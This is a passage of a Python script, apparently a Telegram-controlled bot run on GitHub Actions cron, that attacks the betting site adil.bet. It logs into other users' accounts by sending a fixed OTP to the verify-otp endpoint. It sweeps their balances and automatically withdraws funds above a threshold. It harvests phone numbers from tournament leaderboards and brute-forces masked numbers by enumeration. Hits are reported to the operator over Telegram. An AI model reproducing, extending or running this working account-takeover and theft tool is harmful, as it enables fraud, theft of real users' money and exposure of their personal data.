            for u in j.get('result', []):
                offset = u['update_id'] + 1
                msg = u.get('message') or {}
                txt = msg.get('text') or ''
                chat = str((msg.get('chat') or {}).get('id') or '')
                if not txt:
                    continue
                # LOCK-DOWN: only the owner's chat is served
                if ALLOWED_CHAT and chat != ALLOWED_CHAT:
                    log('ignored message from unauthorised chat %s' % chat)
                    continue
                if not ALLOWED_CHAT and not cfg().get('chat_id'):
                    set_cfg(chat_id=chat)
                elif not ALLOWED_CHAT and cfg().get('chat_id') and chat != cfg().get('chat_id'):
                    log('ignored message from non-owner chat %s' % chat)
                    continue
                threading.Thread(target=handle_command, args=(txt, chat), daemon=True).start()
        except Exception:
            time.sleep(5)


# ---------------------------------------------------------------- main
# ---------------------------------------------------------------- main
def capture_chat_id():
    """If no chat_id is known, read getUpdates once and persist the first chat.

    When ALLOWED_CHAT is set the bot is locked to that single user, so nothing
    is captured from anyone else.
    """
    if ALLOWED_CHAT:
        return ALLOWED_CHAT
    if cfg().get('chat_id'):
        return cfg().get('chat_id')
    if not BOT_TOKEN:
        return None
    try:
        u = requests.get('https://api.telegram.org/bot%s/getUpdates' % BOT_TOKEN,
                         params={'timeout': 0, 'limit': 10}, timeout=25, verify=False).json()
        for up in u.get('result', []):
            m = up.get('message') or up.get('channel_post') or {}
            c = m.get('chat') or {}
            if c.get('id'):
                set_cfg(chat_id=str(c['id']))
                log('captured chat_id=%s' % c['id'])
                return str(c['id'])
    except Exception:
        pass
    return None


def handle_pending_updates():
    """Process any Telegram commands queued since the last cron run.

    GitHub Actions jobs are short-lived, so instead of long-polling we drain
    getUpdates once per run and answer everything. Latency = cron interval.
    """
    global BOT_TOKEN
    if not BOT_TOKEN:
        BOT_TOKEN = _bootstrap_token()
    if not BOT_TOKEN:
        return 0
    handled = 0
    offset = int(cfg().get('tg_offset') or 0)
    try:
        u = requests.get('https://api.telegram.org/bot%s/getUpdates' % BOT_TOKEN,
                         params={'timeout': 0, 'limit': 50, 'offset': offset},
                         timeout=25, verify=False).json()
        ups = u.get('result', [])
        log('telegram: %d pending update(s)' % len(ups))
        for up in ups:
            offset = max(offset, up['update_id'] + 1)
            msg = up.get('message') or up.get('channel_post') or {}
            txt = msg.get('text') or ''
            chat = str((msg.get('chat') or {}).get('id') or '')
            if not txt or not chat:
                continue
            if ALLOWED_CHAT and chat != ALLOWED_CHAT:
                log('ignored command from unauthorised chat %s' % chat)
                continue
            log('cmd from %s: %s' % (chat, txt[:60]))
            try:
                handle_command(txt, chat)
                handled += 1
            except Exception:
                log('cmd error: ' + traceback.format_exc()[-150:])
        set_cfg(tg_offset=offset)
    except Exception:
        log('getUpdates failed: ' + traceback.format_exc()[-120:])
    return handled


def run_budgeted(mode, budget):
    """One-shot mode for GitHub Actions / cron hosts.

    mode='fast'   : refund + leaderboard + spin + a slice of mask cracking
    mode='rescan' : full balance sweep of every known phone
    Exits when the budget is spent.
    """
    t0 = time.time()
    log('=== budgeted run mode=%s budget=%ss ===' % (mode, budget))
    capture_chat_id()
    gist_pull()
    try:
        handle_pending_updates()
    except Exception:
        pass

    def left():
        return budget - (time.time() - t0)

    if mode == 'rescan':
        A = login()
        if not A:
            log('login failed')
            return
        phones = load_master()
        shard = os.environ.get('ADIL_SHARD', '').strip()
        if shard:
            try:
                idx, total = [int(x) for x in shard.split('/')]
                chunk = len(phones) // total + 1
                phones = phones[idx * chunk:(idx + 1) * chunk]
                log('rescan SHARD %d/%d -> %d phones' % (idx + 1, total, len(phones)))
            except Exception:
                log('bad ADIL_SHARD=%r, scanning all' % shard)
        log('rescan: %d phones' % len(phones))
        bal = jload(F_BAL, {})
        done = 0
        for ph in phones:
            if left() < 30:
                break
            try:
                r = requests.post('https://adil.bet/api/v1/auth/verify-otp',
                                  json={'phone': '+' + ph, 'otp': OTP},
                                  headers=H, timeout=10, verify=False)
                if r.status_code == 429:
                    time.sleep(2)
                    continue
                if r.status_code == 200:
                    A2 = {'Authorization': 'Bearer ' + r.json()['data']['access_token'], **H}
                    wd, lk, raw = balance(A2)
                    if wd is not None and (wd > 0 or lk > 0):
                        bal[ph] = {'wd': round(wd, 2), 'locked': round(lk, 2),
                                   'bal': round(float(raw.get('balance') or 0), 2)}
            except Exception:
                pass
            done += 1
            if done % 50 == 0:
                jsave(F_BAL, bal)
                log('  rescan %d/%d' % (done, len(phones)))
            time.sleep(0.03)
        jsave(F_BAL, bal)
        log('rescan done: %d/%d scanned, %d funded' % (done, len(phones), len(bal)))
        whales = [p for p, v in bal.items() if v.get('wd', 0) >= WD_MIN]
        tg_send('🔄 rescan finished: %d/%d scanned, %d funded, %d whales'
                % (done, len(phones), len(bal), len(whales)))
        return

    # fast mode
    # 1) refund watch
    watch = jload(F_WATCH, [])
    thr = float(cfg().get('threshold', 5000.0))
    A = login()
    hits = 0
    for ph in watch:
        if left() < 60:
            break
        try:
            r = requests.post('https://adil.bet/api/v1/auth/verify-otp',
                              json={'phone': '+' + ph, 'otp': OTP},
                              headers=H, timeout=10, verify=False)
            if r.status_code != 200:
                continue
            A2 = {'Authorization': 'Bearer ' + r.json()['data']['access_token'], **H}
            wd, lk, _ = balance(A2)
            if wd is not None and wd >= thr:
                code, rec = withdraw(ph)
                hits += 1
                tg_send('🎯 <b>REFUND CAPTURED</b>\n+%s\nwithdrawable %.2f\n<b>CODE: %s</b>\nagent: %s'
                        % (ph, wd, code or 'FAILED', (rec or {}).get('agent') or 'unassigned'))
        except Exception:
            pass
        time.sleep(0.2)
    log('refund pass: %d watched, %d hits' % (len(watch), hits))

    # 2) leaderboard (one cycle)
    try:
        master = set(load_master())
        new = []
        probe = [13, 20, 21, 27]
        for tid in probe:
            if left() < 45:
                break
            try:
                dj = requests.get('https://adil.bet/api/v1/tournaments/%d/days' % tid,
                                  headers=A, timeout=8, verify=False)
                if dj.status_code != 200:
                    continue
                for d in (dj.json().get('data') or []):
                    did = d.get('id')
                    if not did:
                        continue
                    off = 0
                    while left() > 20:
                        lr = requests.get(
                            'https://adil.bet/api/v1/tournaments/%d/days/%s/leaderboard?limit=100&offset=%d'
                            % (tid, did, off), headers=A, timeout=12, verify=False)
                        if lr.status_code != 200:
                            break
                        dd = lr.json().get('data') or {}
                        rows = dd.get('rows') or []
                        if not rows:
                            break
                        for it in rows:
                            ph = it.get('phone')
                            if not ph:
                                continue
                            ph = str(ph).lstrip('+')
                            if ph.isdigit() and len(ph) >= 12 and ph not in master:
                                master.add(ph)
                                new.append(ph)
                        tot = dd.get('total')
                        off += 100
                        if (tot is not None and off >= int(tot)) or len(rows) < 100:
                            break
            except Exception:
                pass
        if new:
            append_master(new)
            tg_send('📥 leaderboard: +%d new numbers (master %d)' % (len(new), len(master)))
        log('leaderboard pass: +%d new' % len(new))
    except Exception:
        pass

    # 3) mask slice
    try:
        if left() > 120:
            st = jload(F_MASK, {'done': [], 'pending': []})
            fresh = mask_targets_from_topwinners(A) if A else []
            have = {m['last3'] for m in (st.get('pending') or [])} | set(st.get('done') or [])
            for m in fresh:
                if m['last3'] not in have:
                    st.setdefault('pending', []).append(m)
                    have.add(m['last3'])
            jsave(F_MASK, st)
            pend = [m for m in (st.get('pending') or []) if m['last3'] not in set(st.get('done') or [])]
            if pend:
                tgt = pend[0]
                l3 = tgt['last3']
                start_off = int(tgt.get('offset') or 0)
                log('mask slice: last3=%s resuming at offset %d' % (l3, start_off))
                found = []
                checked = 0
                end = min(time.time() + left() - 30, time.time() + 240)
                done_mask = False
                for d1 in ('9', '7'):
                    if done_mask:
                        break
                    for mid in range(100000):
                        idx = (0 if d1 == '9' else 100000) + mid
                        if idx < start_off:
                            continue
                        if time.time() > end:
                            break
                        ph = '251' + d1 + '%05d' % mid + l3
                        try:
                            r = requests.post('https://adil.bet/api/v1/auth/verify-otp',
                                              json={'phone': '+' + ph, 'otp': OTP},
                                              headers=H, timeout=6, verify=False)
                            if r.status_code == 200:
                                found.append(ph)
                                append_master([ph])
                                fa = jload(F_MASKFOUND, [])
                                fa.append(ph)
                                jsave(F_MASKFOUND, fa[-500:])
                                log('mask EXISTS +%s' % ph)
                                tg_send('🔓 mask hit +%s (last3=%s)' % (ph, l3))
                        except Exception:
                            pass
                        checked += 1
                        if checked % 100 == 0:
                            st = jload(F_MASK, {'done': [], 'pending': []})
                            for m in (st.get('pending') or []):
                                if m.get('last3') == l3:
                                    m['offset'] = idx + 1
                            jsave(F_MASK, st)
                        time.sleep(0.01)
                    if time.time() > end:
                        break
                    if mid >= 99999:
                        done_mask = True
                st = jload(F_MASK, {'done': [], 'pending': []})
                if done_mask:
                    st.setdefault('done', []).append(l3)
                    st['pending'] = [m for m in (st.get('pending') or []) if m.get('last3') != l3]
                    log('mask last3=%s COMPLETE: %d found' % (l3, len(found)))
                    tg_send('✅ mask last3=%s complete — %d accounts found' % (l3, len(found)))
                else:
                    for m in (st.get('pending') or []):
                        if m.get('last3') == l3:
                            m['offset'] = min(start_off + checked, 200000)
                    log('mask slice done: %d found this run, saved offset' % len(found))
                jsave(F_MASK, st)
    except Exception:
        pass

    gist_push()
    log('=== budgeted run finished ===')


def main():
    mode = os.environ.get('ADIL_MODE', 'daemon').strip().lower()
    if mode in ('fast', 'rescan'):
        budget = int(os.environ.get('ADIL_BUDGET', '420'))
        try:
            run_budgeted(mode, budget)
        except Exception:
            log('budgeted error: ' + traceback.format_exc()[-300:])
        return

    log('=== adil_bot starting ===')
    log('bot token: %s | master: %d | watchlist: %d'
        % ('set' if BOT_TOKEN else 'MISSING', len(load_master()), len(jload(F_WATCH, []))))
    for fn in (rescan_worker, toplive_worker, refund_worker, lb_worker, spin_worker, mask_worker):
        threading.Thread(target=fn, daemon=True).start()
        time.sleep(1)
    tg_poll()


if __name__ == '__main__':
    main()
